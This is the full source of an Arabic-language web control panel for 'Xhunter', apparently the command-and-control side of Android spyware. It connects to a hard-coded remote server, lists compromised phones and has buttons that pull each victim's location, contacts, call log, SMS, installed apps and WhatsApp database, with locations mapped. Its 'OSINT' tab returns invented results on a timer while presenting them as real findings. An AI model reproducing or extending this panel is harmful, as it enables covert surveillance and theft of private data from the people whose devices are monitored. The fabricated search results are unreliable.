<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>نظام Xhunter المتطور - لوحة تحكم متكاملة</title>

<!-- Leaflet for map -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
:root {
  --primary-color: #00ffcc;
  --secondary-color: #0d3b33;
  --dark-bg: #071021;
  --darker-bg: #050c1a;
  --card-bg: #0a1a2d;
  --text-color: #e0f8f1;
  --border-color: #1c4e40;
  --success-color: #2ecc71;
  --warning-color: #f39c12;
  --danger-color: #e74c3c;
  --info-color: #3498db;
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: var(--dark-bg);
  color: var(--text-color);
  line-height: 1.6;
  overflow-x: hidden;
}

.container {
  display: grid;
  grid-template-columns: 250px 1fr;
  grid-template-rows: 70px 1fr 40px;
  grid-template-areas: 
    "header header"
    "sidebar main"
    "footer footer";
  min-height: 100vh;
}

/* Header Styles */
header {
  grid-area: header;
  background: var(--darker-bg);
  padding: 0 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid var(--border-color);
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
}

.logo {
  display: flex;
  align-items: center;
}

.logo h1 {
  font-size: 22px;
  margin: 0;
  color: var(--primary-color);
}

.logo span {
  color: var(--text-color);
  font-weight: normal;
}

.user-info {
  display: flex;
  align-items: center;
  gap: 10px;
}

.user-avatar {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: var(--secondary-color);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--primary-color);
  font-size: 18px;
}

/* Sidebar Styles */
.sidebar {
  grid-area: sidebar;
  background: var(--darker-bg);
  border-right: 1px solid var(--border-color);
  padding: 20px 0;
  overflow-y: auto;
}

.sidebar-menu {
  list-style: none;
}

.sidebar-menu li {
  margin-bottom: 5px;
}

.sidebar-menu a {
  display: flex;
  align-items: center;
  padding: 12px 20px;
  color: var(--text-color);
  text-decoration: none;
  transition: all 0.3s;
  border-left: 4px solid transparent;
}

.sidebar-menu a:hover, .sidebar-menu a.active {
  background: rgba(0, 255, 204, 0.1);
  border-left-color: var(--primary-color);
  color: var(--primary-color);
}

.sidebar-menu i {
  margin-left: 10px;
  font-size: 18px;
  width: 24px;
  text-align: center;
}

/* Main Content Styles */
.main-content {
  grid-area: main;
  padding: 20px;
  overflow-y: auto;
  background: var(--dark-bg);
}

.panel {
  display: none;
  animation: fadeIn 0.5s;
}

.panel.active {
  display: block;
}

@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}

.panel-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
  padding-bottom: 10px;
  border-bottom: 1px solid var(--border-color);
}

.panel-header h2 {
  color: var(--primary-color);
  font-size: 24px;
}

.stats-cards {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
  gap: 20px;
  margin-bottom: 25px;
}

.stat-card {
  background: var(--card-bg);
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  display: flex;
  align-items: center;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 10px;
  background: rgba(0, 255, 204, 0.2);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-left: 15px;
  font-size: 24px;
  color: var(--primary-color);
}

.stat-info h3 {
  font-size: 28px;
  margin: 0;
  color: var(--primary-color);
}

.stat-info p {
  margin: 5px 0 0;
  color: var(--text-color);
  opacity: 0.8;
}

/* Devices Panel */
.device-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 20px;
}

.device-card {
  background: var(--card-bg);
  border-radius: 8px;
  overflow: hidden;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  transition: transform 0.3s;
}

.device-card:hover {
  transform: translateY(-5px);
}

.device-header {
  background: var(--secondary-color);
  padding: 15px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.device-id {
  font-weight: bold;
  color: var(--primary-color);
  font-size: 16px;
}

.device-status {
  background: var(--success-color);
  color: white;
  padding: 4px 8px;
  border-radius: 20px;
  font-size: 12px;
}

.device-body {
  padding: 15px;
}

.device-info {
  margin-bottom: 15px;
}

.device-info div {
  margin-bottom: 8px;
  display: flex;
  align-items: center;
}

.device-info i {
  margin-left: 8px;
  color: var(--primary-color);
  width: 20px;
}

.device-actions {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 8px;
}

.btn {
  padding: 8px 12px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: bold;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.3s;
}

.btn i {
  margin-left: 5px;
}

.btn-primary {
  background: var(--primary-color);
  color: var(--darker-bg);
}

.btn-primary:hover {
  background: #00e6b8;
}

.btn-secondary {
  background: var(--secondary-color);
  color: white;
}

.btn-secondary:hover {
  background: #0b2e25;
}

/* Map Panel */
#map {
  height: 500px;
  width: 100%;
  border-radius: 8px;
  border: 2px solid var(--border-color);
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
}

/* Logs Panel */
.logs-container {
  background: var(--card-bg);
  border-radius: 8px;
  padding: 15px;
  height: 500px;
  overflow-y: auto;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.log-entry {
  padding: 10px;
  border-bottom: 1px solid var(--border-color);
  display: flex;
  align-items: center;
}

.log-entry:last-child {
  border-bottom: none;
}

.log-time {
  color: var(--primary-color);
  margin-left: 10px;
  font-weight: bold;
  min-width: 90px;
}

.log-message {
  flex: 1;
}

.log-icon {
  margin-left: 10px;
  color: var(--info-color);
}

/* Commands Panel */
.commands-container {
  background: var(--card-bg);
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.command-form {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 15px;
}

.form-group {
  margin-bottom: 15px;
}

.form-group label {
  display: block;
  margin-bottom: 5px;
  color: var(--primary-color);
  font-weight: bold;
}

.form-control {
  width: 100%;
  padding: 10px;
  border-radius: 4px;
  border: 1px solid var(--border-color);
  background: var(--darker-bg);
  color: var(--text-color);
}

.form-control:focus {
  outline: none;
  border-color: var(--primary-color);
}

.btn-block {
  width: 100%;
  grid-column: span 2;
  padding: 12px;
  margin-top: 10px;
}

/* OSINT Panel */
.osint-container {
  background: var(--card-bg);
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.search-box {
  display: flex;
  margin-bottom: 20px;
}

.search-input {
  flex: 1;
  padding: 12px;
  border-radius: 4px 0 0 4px;
  border: 1px solid var(--border-color);
  background: var(--darker-bg);
  color: var(--text-color);
}

.search-btn {
  padding: 0 20px;
  border-radius: 0 4px 4px 0;
  border: none;
  background: var(--primary-color);
  color: var(--darker-bg);
  cursor: pointer;
  font-weight: bold;
}

.results-container {
  margin-top: 20px;
}

.result-card {
  background: var(--darker-bg);
  border-radius: 8px;
  padding: 15px;
  margin-bottom: 15px;
  border-left: 4px solid var(--primary-color);
}

.result-source {
  color: var(--primary-color);
  font-weight: bold;
  margin-bottom: 8px;
  display: flex;
  align-items: center;
}

.result-source i {
  margin-left: 8px;
}

/* Footer Styles */
footer {
  grid-area: footer;
  background: var(--darker-bg);
  display: flex;
  align-items: center;
  justify-content: center;
  border-top: 1px solid var(--border-color);
  font-size: 14px;
  color: var(--text-color);
  opacity: 0.7;
}

/* Connection Status */
.connection-status {
  display: flex;
  align-items: center;
  margin-left: 15px;
  padding: 5px 10px;
  border-radius: 20px;
  font-size: 12px;
  font-weight: bold;
}

.connected {
  background: var(--success-color);
  color: white;
}

.connecting {
  background: var(--warning-color);
  color: white;
}

.disconnected {
  background: var(--danger-color);
  color: white;
}

/* Responsive Design */
@media (max-width: 992px) {
  .container {
    grid-template-columns: 1fr;
    grid-template-areas: 
      "header"
      "main"
      "footer";
  }
  
  .sidebar {
    display: none;
  }
  
  .device-grid {
    grid-template-columns: 1fr;
  }
  
  .command-form {
    grid-template-columns: 1fr;
  }
  
  .btn-block {
    grid-column: span 1;
  }
}

/* Custom Scrollbar */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background: var(--darker-bg);
}

::-webkit-scrollbar-thumb {
  background: var(--secondary-color);
  border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
  background: var(--primary-color);
}
</style>
</head>

<body>
<div class="container">
  <header>
    <div class="logo">
      <h1>نظام <span>Xhunter المتطور</span></h1>
    </div>
    <div class="user-info">
      <div class="user-avatar">
        <i class="fas fa-user-shield"></i>
      </div>
      <div>مدير النظام</div>
      <div class="connection-status connecting" id="connectionStatus">
        <i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...
      </div>
    </div>
  </header>
  
  <aside class="sidebar">
    <ul class="sidebar-menu">
      <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
      <li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
      <li><a href="#" data-tab="logs"><i class="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
      <li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
      <li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
      <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></li>
      <li><a href="#"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</a></li>
    </ul>
  </aside>
  
  <main class="main-content">
    <!-- Devices Panel -->
    <section id="panel-devices" class="panel active">
      <div class="panel-header">
        <h2><i class="fas fa-microchip"></i> الأجهزة المتصلة</h2>
        <div>عدد الأجهزة: <span id="devices-count">0</span></div>
      </div>
      
      <div class="stats-cards">
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-mobile-alt"></i>
          </div>
          <div class="stat-info">
            <h3 id="active-devices">0</h3>
            <p>أجهزة نشطة</p>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-map-marker-alt"></i>
          </div>
          <div class="stat-info">
            <h3 id="located-devices">0</h3>
            <p>مواقع محددة</p>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-database"></i>
          </div>
          <div class="stat-info">
            <h3 id="data-points">0</h3>
            <p>بيانات مجمعة</p>
          </div>
        </div>
      </div>
      
      <div id="devices-empty" style="text-align: center; padding: 40px; color: #6c757d;">
        <i class="fas fa-plug" style="font-size: 48px; margin-bottom: 15px;"></i>
        <h3>لا توجد أجهزة متصلة</h3>
        <p>سيتم عرض الأجهزة فور اتصالها بالسيرفر</p>
      </div>
      
      <div class="device-grid" id="devices">
        <!-- Devices will be populated by JavaScript -->
      </div>
    </section>
    
    <!-- Map Panel -->
    <section id="panel-map" class="panel">
      <div class="panel-header">
        <h2><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</h2>
        <button class="btn btn-primary" id="refreshMap"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
      </div>
      
      <div id="map"></div>
    </section>
    
    <!-- Logs Panel -->
    <section id="panel-logs" class="panel">
      <div class="panel-header">
        <h2><i class="fas fa-clipboard-list"></i> سجل الأحداث</h2>
        <button class="btn btn-primary" id="clear-logs"><i class="fas fa-trash"></i> مسح السجل</button>
      </div>
      
      <div class="logs-container" id="logs">
        <!-- Logs will be populated by JavaScript -->
      </div>
    </section>
    
    <!-- Commands Panel -->
    <section id="panel-commands" class="panel">
      <div class="panel-header">
        <h2><i class="fas fa-terminal"></i> إصدار الأوامر</h2>
        <div>تحكم كامل في الأجهزة</div>
      </div>
      
      <div class="commands-container">
        <div id="no-devices-message" style="text-align: center; padding: 20px; color: #6c757d;">
          <i class="fas fa-exclamation-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
          <p>لا توجد أجهزة متصلة لإصدار الأوامر</p>
        </div>
        
        <div class="command-form" id="command-form" style="display: none;">
          <div class="form-group">
            <label for="deviceSelect"><i class="fas fa-microchip"></i> اختر الجهاز</label>
            <select id="deviceSelect" class="form-control">
              <option value="">-- اختر جهازا --</option>
            </select>
          </div>
          
          <div class="form-group">
            <label for="commandAction"><i class="fas fa-cogs"></i> نوع الأمر</label>
            <select id="commandAction" class="form-control">
              <option value="getLocation">طلب الموقع</option>
              <option value="getInstalledApps">الحصول على التطبيقات</option>
              <option value="getContacts">جهات الاتصال</option>
              <option value="getCallLog">سجل المكالمات</option>
              <option value="getSMS">الرسائل النصية</option>
              <option value="getExtraData">بيانات إضافية</option>
              <option value="downloadWhatsappDatabase">قاعدة بيانات واتساب</option>
            </select>
          </div>
          
          <div class="form-group">
            <label for="commandData"><i class="fas fa-code"></i> بيانات إضافية (JSON)</label>
            <input type="text" id="commandData" class="form-control" placeholder='بيانات JSON (اختياري)'>
          </div>
          
          <button id="sendCommand" class="btn btn-primary btn-block">
            <i class="fas fa-paper-plane"></i> إرسال الأمر
          </button>
        </div>
      </div>
    </section>
    
    <!-- OSINT Panel -->
    <section id="panel-osint" class="panel">
      <div class="panel-header">
        <h2><i class="fas fa-search"></i> جمع المعلومات عن الهدف</h2>
        <div>أدوات الاستخبارات المفتوحة المصدر</div>
      </div>
      
      <div class="osint-container">
        <div class="search-box">
          <input type="text" id="osintInput" class="search-input" placeholder="أدخل اسم، بريد إلكتروني، رقم هاتف أو معرف">
          <button id="osintSearchBtn" class="search-btn"><i class="fas fa-search"></i> بحث</button>
        </div>
        
        <div class="results-container" id="osintResults">
          <!-- Results will be populated by JavaScript -->
        </div>
      </div>
    </section>
  </main>
  
  <footer>
    <p>نظام Xhunter المتطور للإستخبارات المفتوحة - الإصدار 2.1 | &copy; 2023</p>
  </footer>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
// Initialize socket connection
let socket;
let reconnectAttempts = 0;
const maxReconnectAttempts = 5;

function connectSocket() {
  socket = io('https://projectd-vu1m.onrender.com', { 
    transports: ['websocket', 'polling'], 
    reconnection: true,
    reconnectionAttempts: maxReconnectAttempts,
    reconnectionDelay: 1000,
    timeout: 20000
  });
  
  setupSocketEvents();
}

function setupSocketEvents() {
  // Update connection status
  socket.on('connect', () => {
    updateConnectionStatus('connected', 'متصل بالسيرفر');
    reconnectAttempts = 0;
    socket.emit('adminJoin');
    addLog('تم الاتصال بالسيرفر بنجاح', 'success');
  });
  
  socket.on('disconnect', (reason) => {
    updateConnectionStatus('disconnected', 'انقطع الاتصال');
    addLog(`انقطع الاتصال بالسيرفر: ${reason}`, 'error');
    
    if (reason === 'io server disconnect') {
      // Server intentionally disconnected, try to reconnect
      socket.connect();
    }
  });
  
  socket.on('connect_error', (error) => {
    updateConnectionStatus('connecting', 'جاري إعادة الاتصال...');
    reconnectAttempts++;
    addLog(`خطأ في الاتصال: ${error.message} (محاولة ${reconnectAttempts}/${maxReconnectAttempts})`, 'error');
  });
  
  socket.on('reconnect_attempt', (attempt) => {
    updateConnectionStatus('connecting', `محاولة إعادة الاتصال (${attempt}/${maxReconnectAttempts})`);
  });
  
  socket.on('reconnect', (attempt) => {
    updateConnectionStatus('connected', 'تم إعادة الاتصال');
    addLog(`تم إعادة الاتصال بعد ${attempt} محاولة`, 'success');
  });
  
  socket.on('reconnect_failed', () => {
    updateConnectionStatus('disconnected', 'فشل إعادة الاتصال');
    addLog('فشل إعادة الاتصال بعد جميع المحاولات', 'error');
  });
  
  // Handle device connection
  socket.on('join', device => {
    renderDevice(device);
    updateDevicesCount();
    addLog(`جهاز متصل: ${device.id} (${device.model || 'غير معروف'})`, 'success');
  });
  
  // Handle device disconnection
  socket.on('deviceDisconnected', deviceId => {
    const deviceElement = document.getElementById(`device_${deviceId}`);
    if (deviceElement) {
      deviceElement.remove();
      delete devicesMap[deviceId];
      updateDevicesCount();
      addLog(`انقطع اتصال الجهاز: ${deviceId}`, 'warning');
    }
    
    // Remove from select dropdown
    const option = document.querySelector(`#deviceSelect option[value="${deviceId}"]`);
    if (option) {
      option.remove();
    }
  });
  
  // Handle existing devices when admin joins
  socket.on('existingDevices', devices => {
    addLog(`جاري تحميل ${devices.length} جهاز متصل`, 'info');
    devices.forEach(device => {
      renderDevice(device);
    });
    updateDevicesCount();
  });
  
  // Handle request results
  socket.on('requestResult', payload => {
    try {
      const obj = typeof payload === 'string' ? JSON.parse(payload) : payload;
      addLog(`طلب ${obj.action} → ${obj.to}: ${obj.ok ? 'نجح' : 'فشل'}`, obj.ok ? 'success' : 'error');
      
      const extraDiv = document.getElementById('extra_' + obj.to);
      if (obj.ok && obj.result) {
        switch (obj.action) {
          case 'getLocation':
            extraDiv.innerHTML = `
              <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
                <strong>الموقع:</strong> ${obj.result.data.lat}, ${obj.result.data.lon}<br>
                <strong>العنوان:</strong> ${obj.result.data.address || 'غير متاح'}
              </div>
            `;
            renderDevice({id: obj.to, lastLocation: obj.result.data});
            updateMapWithDevice(obj.to, obj.result.data);
            break;
          default:
            extraDiv.innerHTML = `
              <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
                <strong>النتيجة:</strong> ${JSON.stringify(obj.result.data).substring(0, 150)}...
              </div>
            `;
        }
      }
    } catch (e) { 
      console.error('Error processing request result:', e);
      addLog('خطأ في معالجة الاستجابة من الجهاز', 'error');
    }
  });
}

// DOM Elements
const devicesDiv = document.getElementById('devices');
const logsDiv = document.getElementById('logs');
const deviceSelect = document.getElementById('deviceSelect');
const commandActionEl = document.getElementById('commandAction');
const commandDataEl = document.getElementById('commandData');
const sendCommandBtn = document.getElementById('sendCommand');
const osintInput = document.getElementById('osintInput');
const osintResults = document.getElementById('osintResults');
const osintSearchBtn = document.getElementById('osintSearchBtn');
const clearLogsBtn = document.getElementById('clear-logs');
const devicesCountEl = document.getElementById('devices-count');
const activeDevicesEl = document.getElementById('active-devices');
const locatedDevicesEl = document.getElementById('located-devices');
const dataPointsEl = document.getElementById('data-points');
const connectionStatusEl = document.getElementById('connectionStatus');
const refreshMapBtn = document.getElementById('refreshMap');
const noDevicesMessage = document.getElementById('no-devices-message');
const commandForm = document.getElementById('command-form');

const devicesMap = {}; 
let map, markers = {};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
  // Tab switching
  document.querySelectorAll('.sidebar-menu a').forEach(tab => {
    tab.addEventListener('click', (e) => {
      e.preventDefault();
      if (tab.dataset.tab) {
        document.querySelectorAll('.sidebar-menu a').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
        document.getElementById('panel-' + tab.dataset.tab).classList.add('active');
        
        if (tab.dataset.tab === 'map') initMap();
      }
    });
  });
  
  // Clear logs button
  clearLogsBtn.addEventListener('click', () => {
    logsDiv.innerHTML = '';
    addLog('تم مسح سجل الأحداث', 'info');
  });
  
  // Refresh map button
  refreshMapBtn.addEventListener('click', () => {
    initMap();
    addLog('تم تحديث الخريطة', 'info');
  });
  
  // Add some initial logs
  addLog('تم تحميل لوحة التحكم بنجاح', 'success');
  addLog('جاري الاتصال بالسيرفر...', 'info');
  
  // Initialize socket connection
  connectSocket();
});

// Update connection status UI
function updateConnectionStatus(status, message) {
  connectionStatusEl.className = `connection-status ${status}`;
  
  let icon = 'fa-sync-alt fa-spin';
  if (status === 'connected') icon = 'fa-check-circle';
  if (status === 'disconnected') icon = 'fa-times-circle';
  
  connectionStatusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
}

// Initialize Leaflet map
function initMap() {
  if (map) {
    map.remove();
    markers = {};
  }
  
  map = L.map('map').setView([24.0, 45.0], 5);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
  
  // Add existing devices with locations to the map
  Object.keys(devicesMap).forEach(deviceId => {
    const deviceElement = document.getElementById(`device_${deviceId}`);
    if (deviceElement) {
      const extraDiv = deviceElement.querySelector('.device-extra');
      if (extraDiv && extraDiv.textContent.includes('الموقع:')) {
        const match = extraDiv.textContent.match(/الموقع:\s*([0-9.]+),\s*([0-9.]+)/);
        if (match && match.length === 3) {
          const lat = parseFloat(match[1]);
          const lon = parseFloat(match[2]);
          updateMapWithDevice(deviceId, { lat, lon });
        }
      }
    }
  });
}

// Update map with device location
function updateMapWithDevice(deviceId, locationData) {
  if (!map) initMap();
  
  if (markers[deviceId]) {
    markers[deviceId].setLatLng([locationData.lat, locationData.lon]);
  } else {
    markers[deviceId] = L.marker([locationData.lat, locationData.lon])
      .addTo(map)
      .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}`);
  }
}

// Update devices count
function updateDevicesCount() {
  const count = Object.keys(devicesMap).length;
  devicesCountEl.textContent = count;
  activeDevicesEl.textContent = count;
  
  // Show/hide no devices message
  const devicesEmpty = document.getElementById('devices-empty');
  if (count === 0) {
    devicesEmpty.style.display = 'block';
    noDevicesMessage.style.display = 'block';
    commandForm.style.display = 'none';
  } else {
    devicesEmpty.style.display = 'none';
    noDevicesMessage.style.display = 'none';
    commandForm.style.display = 'grid';
  }
  
  // Update located devices count
  const locatedCount = Object.values(devicesMap).filter(device => {
    const extraDiv = device.querySelector('.device-extra');
    return extraDiv && extraDiv.textContent.includes('الموقع:');
  }).length;
  
  locatedDevicesEl.textContent = locatedCount;
}

// Render device function
function renderDevice(device) {
  let deviceCard = devicesMap[device.id];
  
  if (!deviceCard) {
    deviceCard = document.createElement('div');
    deviceCard.className = 'device-card';
    deviceCard.id = 'device_' + device.id;
    
    devicesDiv.appendChild(deviceCard);
    devicesMap[device.id] = deviceCard;

    // Add to device select dropdown
    const opt = document.createElement('option');
    opt.value = device.id;
    opt.textContent = device.id + ' (' + (device.model || 'N/A') + ')';
    deviceSelect.appendChild(opt);
  }
  
  // Update device card content
  deviceCard.innerHTML = `
    <div class="device-header">
      <div class="device-id">${device.id}</div>
      <div class="device-status">نشط</div>
    </div>
    <div class="device-body">
      <div class="device-info">
        <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
        <div><i class="fas fa-globe"></i> ${device.ip || 'غير متاح'}</div>
        <div><i class="fas fa-code-branch"></i> ${device.platform || 'N/A'}</div>
        <div><i class="fas fa-language"></i> ${device.language || 'N/A'}</div>
        <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</div>
      </div>
      <div id="extra_${device.id}" class="device-extra"></div>
      <div class="device-actions">
        <button class="btn btn-primary" onclick="requestLocation('${device.id}')"><i class="fas fa-map-marker-alt"></i> الموقع</button>
        <button class="btn btn-primary" onclick="requestApps('${device.id}')"><i class="fas fa-th"></i> التطبيقات</button>
        <button class="btn btn-secondary" onclick="requestContacts('${device.id}')"><i class="fas fa-address-book"></i> جهات اتصال</button>
        <button class="btn btn-secondary" onclick="requestCallLog('${device.id}')"><i class="fas fa-phone"></i> المكالمات</button>
        <button class="btn btn-secondary" onclick="requestSMS('${device.id}')"><i class="fas fa-sms"></i> الرسائل</button>
        <button class="btn btn-secondary" onclick="requestWhatsappDB('${device.id}')"><i class="fas fa-comment"></i> واتساب</button>
      </div>
    </div>
  `;

  // Update device location if available
  if (device.lastLocation && device.lastLocation.lat && device.lastLocation.lon) {
    const extraDiv = document.getElementById('extra_' + device.id);
    if (extraDiv) {
      extraDiv.innerHTML = `
        <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
          <strong>الموقع:</strong> ${device.lastLocation.lat}, ${device.lastLocation.lon}<br>
          <strong>العنوان:</strong> ${device.lastLocation.address || 'غير متاح'}
        </div>
      `;
    }
    updateMapWithDevice(device.id, device.lastLocation);
  }
  
  updateDevicesCount();
}

// Add log entry
function addLog(msg, type = 'info') {
  const logEntry = document.createElement('div');
  logEntry.className = 'log-entry';
  
  let icon = 'fa-info-circle';
  if (type === 'success') icon = 'fa-check-circle';
  if (type === 'warning') icon = 'fa-exclamation-circle';
  if (type === 'error') icon = 'fa-times-circle';
  
  logEntry.innerHTML = `
    <div class="log-time">${new Date().toLocaleTimeString()}</div>
    <div class="log-icon"><i class="fas ${icon}"></i></div>
    <div class="log-message">${msg}</div>
  `;
  
  logsDiv.appendChild(logEntry);
  logsDiv.scrollTop = logsDiv.scrollHeight;
  
  // Update data points counter
  dataPointsEl.textContent = parseInt(dataPointsEl.textContent || 0) + 1;
}

// Send command
sendCommandBtn.addEventListener('click', () => {
  const to = deviceSelect.value;
  const action = commandActionEl.value;
  let data = null;
  
  if (commandDataEl.value.trim()) {
    try { 
      data = JSON.parse(commandDataEl.value.trim()); 
    } catch (e) { 
      addLog('صيغة JSON غير صحيحة', 'error');
      return; 
    }
  }
  
  if (!to) { 
    addLog('يرجى اختيار جهاز', 'warning');
    return; 
  }
  
  socket.emit('request', { to, action, data });
  addLog(`تم إرسال الأمر: ${action} → ${to}`, 'info');
});

// Command shortcuts
function requestLocation(id) { 
  socket.emit('request', { to: id, action: 'getLocation' });
  addLog(`طلب موقع الجهاز: ${id}`, 'info');
}

function requestApps(id) { 
  socket.emit('request', { to: id, action: 'getInstalledApps' });
  addLog(`طلب قائمة التطبيقات: ${id}`, 'info');
}

function requestContacts(id) { 
  socket.emit('request', { to: id, action: 'getContacts' });
  addLog(`طلب جهات الاتصال: ${id}`, 'info');
}

function requestCallLog(id) { 
  socket.emit('request', { to: id, action: 'getCallLog' });
  addLog(`طلب سجل المكالمات: ${id}`, 'info');
}

function requestSMS(id) { 
  socket.emit('request', { to: id, action: 'getSMS' });
  addLog(`طلب الرسائل النصية: ${id}`, 'info');
}

function requestWhatsappDB(id) { 
  socket.emit('request', { to: id, action: 'downloadWhatsappDatabase' });
  addLog(`طلب قاعدة بيانات واتساب: ${id}`, 'info');
}

// OSINT Search
osintSearchBtn.addEventListener('click', () => {
  const query = osintInput.value.trim();
  if (!query) { 
    addLog('يرجى إدخال مصطلح البحث', 'warning');
    return; 
  }
  
  osintResults.innerHTML = '<div class="result-card">جاري البحث في مصادر المعلومات المفتوحة...</div>';
  addLog(`بدء البحث عن: ${query}`, 'info');

  // Simulate OSINT search (replace with actual API calls)
  setTimeout(() => {
    osintResults.innerHTML = '';
    
    const sources = [
      {
        name: 'محرك البحث',
        icon: 'fa-google',
        result: `عُثر على 34 نتيجة مرتبطة بـ "${query}" في محركات البحث`
      },
      {
        name: 'وسائل التواصل الاجتماعي',
        icon: 'fa-hashtag',
        result: `5 ملفات شخصية محتملة على منصات التواصل الاجتماعي`
      },
      {
        name: 'قواعد البيانات',
        icon: 'fa-database',
        result: `تسرب بيانات محتمل مرتبط بالاستعلام في 3 قواعد بيانات`
      },
      {
        name: 'سجلات النطاقات',
        icon: 'fa-globe',
        result: `لا توجد نطاقات مسجلة مباشرة مرتبطة بالاستعلام`
      },
      {
        name: 'تحليل الصور',
        icon: 'fa-camera',
        result: `لم يتم العثور على صور مرتبطة مباشرة بالاستعلام`
      }
    ];
    
    sources.forEach(source => {
      const resultDiv = document.createElement('div');
      resultDiv.className = 'result-card';
      resultDiv.innerHTML = `
        <div class="result-source">
          <i class="fas ${source.icon}"></i> ${source.name}
        </div>
        <div>${source.result}</div>
      `;
      osintResults.appendChild(resultDiv);
    });
    
    addLog(`تم انتهاء البحث عن: ${query} - تم العثور على ${sources.length} مصدر`, 'success');
  }, 2000);
});
</script>
</body>
</html>
